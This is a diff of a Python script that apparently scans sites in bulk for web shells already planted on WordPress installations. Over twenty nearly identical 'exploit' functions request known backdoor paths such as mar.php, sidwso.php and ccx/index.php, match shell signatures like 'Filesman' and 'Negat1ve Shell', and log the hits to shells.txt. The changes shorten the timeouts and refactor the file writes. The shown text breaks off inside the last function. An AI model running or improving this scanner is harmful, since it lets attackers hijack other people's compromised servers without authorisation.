@@ -66,16 +66,16 @@ def URLdomain(site):
 def exploit_1(url):
     try:
         url = 'http://' + URLdomain(url)
-        check = requests.get(url + '/wp-content/themes/ccx/index.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
+        check = requests.get(url + '/wp-content/themes/ccx/index.php', headers=headers, allow_redirects=True, verify=False, timeout=5)
         if 'Negat1ve Shell' in check.content.decode("utf-8"):
             print('[#] Exploit 1 --> ' + url + ' {}[Successfully]'.format(fg))
-            open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
+            write_to_file('shells.txt', url + '/wp-content/themes/ccx/index.php')
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url + '/wp-content/themes/ccx/index.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
+            check = requests.get(url + '/wp-content/themes/ccx/index.php', headers=headers, allow_redirects=True, verify=False, timeout=5)
             if 'Negat1ve Shell' in check.content.decode("utf-8"):
                 print('[#] Exploit 1 --> ' + url + ' {}[Successfully]'.format(fg))
-                open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/ccx/index.php')
             else:
                 print('[#] Exploit 1 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -86,17 +86,17 @@ def exploit_2(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/sid/sidwso.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/sid/sidwso.php')
             else:
                 print ('[#] Exploit 2 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -107,17 +107,17 @@ def exploit_3(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/seoplugins/mar.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/seoplugins/mar.php')
             else:
                 print ('[#] Exploit 3 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -128,17 +128,17 @@ def exploit_4(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/seoplugins/mar.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/seoplugins/mar.php')
             else:
                 print ('[#] Exploit 4 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -149,17 +149,17 @@ def exploit_5(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print ('[#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/images/mar.php\n')
+                write_to_file('shells.txt', url + '/images/mar.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/images/mar.php\n')
+                    write_to_file('shells.txt', url + '/images/mar.php')
             else:
                 print ('[#] Exploit 5 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -170,17 +170,17 @@ def exploit_6(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print ('[#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
+                write_to_file('shells.txt', url + '/m4r1ju4n4.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
+                    write_to_file('shells.txt', url + '/m4r1ju4n4.php')
             else:
                 print ('[#] Exploit 6 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -191,17 +191,17 @@ def exploit_7(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/css/colors/coffee/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/css/colors/coffee/mari.php')
             else:
                 print (' Exploit 7 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -212,17 +212,17 @@ def exploit_8(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/css/colors/coffee/marijuana.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/css/colors/coffee/marijuana.php')
             else:
                 print ('[#] Exploit 8 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -233,17 +233,17 @@ def exploit_9(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/css/colors/maro.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/css/colors/maro.php')
             else:
                 print ('[#] Exploit 9 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -254,17 +254,17 @@ def exploit_10(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/css/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/css/mari.php')
             else:
                 print ('[#] Exploit 10 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -275,17 +275,17 @@ def exploit_11(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/owfsmac/mar.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/owfsmac/mar.php')
             else:
                 print ('[#] Exploit 11 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -296,17 +296,17 @@ def exploit_12(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/css/maro.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/css/maro.php')
             else:
                 print ('[#] Exploit 12 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -317,17 +317,17 @@ def exploit_13(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/includes/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/includes/mari.php')
             else:
                 print ('[#] Exploit 13 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -338,17 +338,17 @@ def exploit_14(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/maint/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/maint/mari.php')
             else:
                 print ('[#] Exploit 14 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -359,17 +359,17 @@ def exploit_15(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/mari.php')
             else:
                 print ('[#] Exploit 15 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -380,17 +380,17 @@ def exploit_16(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-content/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/mari.php')
             else:
                 print ('[#] Exploit 16 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -401,17 +401,17 @@ def exploit_17(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/aryabot/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/aryabot/mari.php')
             else:
                 print ('[#] Exploit 17 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -422,17 +422,17 @@ def exploit_18(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/aryabot/mar.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/aryabot/mar.php')
             else:
                 print ('[#] Exploit 18 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -443,17 +443,17 @@ def exploit_19(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/owfsmac/maro.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/owfsmac/maro.php')
             else:
                 print ('[#] Exploit 19 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -464,17 +464,17 @@ def exploit_20(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=5)
         if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                 print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/mari.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                     print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/mari.php')
             else:
                 print ('[#] Exploit 20 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -484,17 +484,17 @@ def exploit_21(url):
     try:
         # try with http
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/hello.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/hello.php')
             else:
                 print ('[#] Exploit 21 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -505,17 +505,17 @@ def exploit_22(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Negat1ve Shell' in check.content.decode("utf-8")):
                 print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/ccx/index.php\n')
+                write_to_file('shells.txt', url + '/ccx/index.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Negat1ve Shell' in check.content.decode("utf-8"):
                     print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/ccx/index.php\n')
+                    write_to_file('shells.txt', url + '/ccx/index.php')
             else:
                 print ('[#] Exploit 22 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -526,17 +526,17 @@ def exploit_23(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Negat1ve Shell' in check.content.decode("utf-8")):
                 print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/ccx/index.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Negat1ve Shell' in check.content.decode("utf-8"):
                     print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/ccx/index.php')
             else:
